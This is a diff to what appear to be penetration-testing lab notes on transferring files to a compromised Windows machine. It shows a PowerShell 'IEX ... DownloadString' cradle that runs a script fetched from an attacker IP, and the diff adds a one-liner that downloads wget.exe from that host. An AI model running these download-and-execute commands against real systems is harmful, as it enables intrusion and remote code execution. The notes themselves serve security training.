@@ -41,3 +41,8 @@ Next, we will run the script with the following command on our compromised Windo
 C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
 Hello World
 ```
+
+### New-Object
+```powershell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+```
